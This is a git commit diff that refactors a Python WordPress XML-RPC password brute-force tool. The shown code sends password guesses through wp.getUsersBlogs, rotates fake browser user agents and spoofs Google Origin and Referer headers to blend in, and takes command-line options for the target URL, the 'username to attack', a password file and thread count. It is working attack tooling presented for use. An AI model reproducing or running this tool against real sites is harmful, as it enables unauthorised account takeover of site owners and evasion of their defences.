7a0e5f3edb4612d3fab1bb7cbc784e5df469ce6f
Johannes2306 <Johannes2306@users.noreply.github.com>
2023-02-08 20:47:10 +0200

    Update xmlrpc-brute.py

--- xmlrpc-brute.py
+++ xmlrpc-brute.py
@@ -29,39 +29,39 @@ class XMLRPCBruteForce:
         self.passwords = []
         self.q = Queue()
         self.load_passwords()
-        self.headers_useragents = []
-
-        self.headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-        self.headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-        self.headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+        self.headers_useragents = [
+            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
+            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
+            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
+            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
+            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
+            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
+            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
+            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
+            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
+            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
+        ]
 
     def load_passwords(self):
         with open(self.password_file, 'r', encoding='UTF-8') as f:
             self.passwords = [line.strip() for line in f]
 
     def set_headers(self):
-            referrer = ''.join([chr(random.randint(65, 90)) for i in range(0, random.randint(5, 10))])
-            headers = {
-                'Host': self.url.split('/xmlrpc.php')[0].split('//')[1],
-                'User-Agent': random.choice(self.headers_useragents),
-                'Cache-Control': 'no-cache',
-                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-                'Origin': 'https://www.google.com',
-                'Referer': f"https://www.google.com/?q={referrer}",
-                'Keep-Alive': str(random.randint(110,120)),
-                'content-type': 'text/xml;charset=UTF-8',
-                'Connection': 'keep-alive'
-                }
-            return headers
+        referrer = ''.join([chr(random.randint(65, 90)) for i in range(0, random.randint(5, 10))])
+        headers = {
+            'Host': self.url.split('/xmlrpc.php')[0].split('//')[1],
+            'User-Agent': random.choice(self.headers_useragents),
+            'Cache-Control': 'no-cache',
+            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+            'Origin': 'https://www.google.com',
+            'Referer': f"https://www.google.com/?q={referrer}",
+            'Keep-Alive': str(random.randint(110,120)),
+            'content-type': 'text/xml;charset=UTF-8',
+            'Connection': 'keep-alive'
+            }
+        return headers
 
     def request_xmlrpc(self, username, password):
         data = f"<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{username}</string></value></param><param><value><string>{password}</string></value></param></params></methodCall>"
@@ -108,7 +108,6 @@ if __name__ == "__main__":
     parser.add_argument('-U', '--username', required=True, help='The username to attack')
     parser.add_argument('-P', '--passwords-file', required=True, help='File containing passwords, one per line')
     parser.add_argument('-t', '--threads', default=10, type=int, help='Number of threads to use')
-    # parser.add_argument('-m', '--method', default='wp.getUsersBlogs', help='XMLRPC method to use (eg., wp.getUsersBlogs, metaWeblog.getUsersBlogs)')
     args = parser.parse_args()
 
     banner(args.url, args.username, args.passwords_file, args.threads)
